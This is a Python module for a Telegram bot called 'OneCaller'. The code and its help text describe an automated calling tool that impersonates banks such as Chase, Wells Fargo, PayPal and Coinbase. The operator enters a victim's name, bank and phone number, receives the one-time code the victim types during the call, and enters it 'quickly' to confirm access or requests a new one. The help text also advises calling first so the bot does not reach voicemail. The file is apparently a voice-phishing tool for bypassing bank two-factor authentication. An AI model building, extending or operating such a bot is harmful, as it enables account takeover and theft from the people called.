#call_utils.py
import telebot

class CallUtils:
    def __init__(self):
        self.BANK_OPTIONS = [
            "JPMorgan Chase", "Citibank", "Goldman Sachs", "TD Bank", "Citizens Bank",
            "Morgan Stanley", "KeyBank", "Bank of America", "U.S. Bank", "Truist",
            "BMO Harris", "Fifth Third Bank", "Huntington", "Ally Bank", "Wells Fargo",
            "PNC Bank", "Capital One", "First Citizens", "M&T Bank", "American Express", "Paypal", "Coinbase"
        ]
        self.BANKS_PER_PAGE = 5
        self.status_emojis = {
            'queued': '⏳', 'ringing': '🔔', 'in-progress': '📞',
            'completed': '✅', 'busy': '⏰', 'failed': '❌',
            'no-answer': '📵', 'canceled': '🚫'
        }

    def create_bank_keyboard(self, page=0):
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        start_index = page * self.BANKS_PER_PAGE
        end_index = start_index + self.BANKS_PER_PAGE

        # Add custom bank button at the top
        markup.add(telebot.types.InlineKeyboardButton("➕ Other Bank", callback_data="custom_bank"))

        banks_page = self.BANK_OPTIONS[start_index:end_index]
        for bank in banks_page:
            markup.add(telebot.types.InlineKeyboardButton(bank, callback_data=f"bank_{bank}"))

        nav_buttons = []
        if page > 0:
            nav_buttons.append(telebot.types.InlineKeyboardButton("⬅️ Back", callback_data=f"banks_page_{page-1}"))
        if end_index < len(self.BANK_OPTIONS):
            nav_buttons.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"banks_page_{page+1}"))

        if nav_buttons:
            markup.row(*nav_buttons)
        return markup

    def create_verification_keyboard(self, call_sid):
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            telebot.types.InlineKeyboardButton("✅ Accept", callback_data=f"verify_accept_{call_sid}"),
            telebot.types.InlineKeyboardButton("❌ Decline", callback_data=f"verify_decline_{call_sid}"),
            telebot.types.InlineKeyboardButton("⏹️ Hangup", callback_data=f"hangup_{call_sid}")
        )
        return markup

    def create_hangup_keyboard(self, call_sid):
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("⏹️ Hangup", callback_data=f"hangup_{call_sid}"))
        return markup

    def handle_bank_selection(self, call, bot, user_states):
        chat_id = call.message.chat.id
        
        if call.data == "custom_bank":
            bot.answer_callback_query(call.id)
            recipient_name = user_states[chat_id]["recipient_name"] if isinstance(user_states[chat_id], dict) else None
            user_states[chat_id] = {
                "state": "awaiting_custom_bank",
                "recipient_name": recipient_name
            }
            bot.send_message(chat_id, "📝 Please enter the name of the bank:")
            return

        if call.data.startswith("bank_"):
            bank_name = call.data[5:]
            bot.answer_callback_query(call.id, text=f"Selected: {bank_name}")
            recipient_name = user_states[chat_id]["recipient_name"] if isinstance(user_states[chat_id], dict) else None
            user_states[chat_id] = {"state": "awaiting_phone", "bank": bank_name, "recipient_name": recipient_name}
            bot.send_message(
                chat_id,
                "📱 Enter the phone number to verify:\n"
                "Format: +[country_code][number]\n"
                "Example: +15017122661"
            )
        elif call.data.startswith("banks_page_"):
            page = int(call.data.split("_")[2])
            bot.answer_callback_query(call.id)
            bot.edit_message_reply_markup(
                chat_id=chat_id,
                message_id=call.message.message_id,
                reply_markup=self.create_bank_keyboard(page)
            )

    def handle_message(self, message, bot, user_states):
        chat_id = message.chat.id
        if isinstance(user_states.get(chat_id), dict) and user_states[chat_id].get("state") == "awaiting_custom_bank":
            custom_bank = message.text.strip()
            recipient_name = user_states[chat_id].get("recipient_name")
            user_states[chat_id] = {
                "state": "awaiting_phone",
                "bank": custom_bank,
                "recipient_name": recipient_name
            }
            bot.send_message(
                chat_id,
                "📱 Enter the phone number to verify:\n"
                "Format: +[country_code][number]\n"
                "Example: +15017122661"
            )
            return True
        return False

    def handle_utility_callbacks(self, call, bot):
        chat_id = call.message.chat.id
        if call.data == "help":
            bot.answer_callback_query(call.id)
            help_text = (
                "📌 *OneCaller Guide*\n\n"
                "1️⃣ Click 'Start Call'\n"
                "2️⃣ Enter recipient's name\n"
                "3️⃣ Select the specific bank\n"
                "4️⃣ Enter phone number with country code\n"
                "5️⃣ Choose *Custom Bank* to enter the bank or card name if the bank or card is not displayed"
                "6️⃣ If the call is in progress and Call recipient is ready to enter code, you will be prompted to *SEND CODE*."
                "7️⃣ If the *CODE* is displayed, please quickly enter it to confirm, once it works choose *ACCEPT✅* to end the call, if the code is incorrect, choose *DECLINE❌* to request for a new code."
                "Thank you for using our service 😊."
                "Always call the number to mae sure user answers to avoid *voicemails*, when your call is answered by a real person, hangup and call using the BOT in 2-3mins later."
                "📞 *Call Status Icons:*\n"
                "🔔 Ringing\n"
                "📞 In Progress\n"
                "✅ Completed\n"
                "❌ Failed\n"
                "⏰ Busy\n"
                "📵 No Answer\n\n"
            )
            bot.send_message(chat_id, help_text, parse_mode="Markdown")
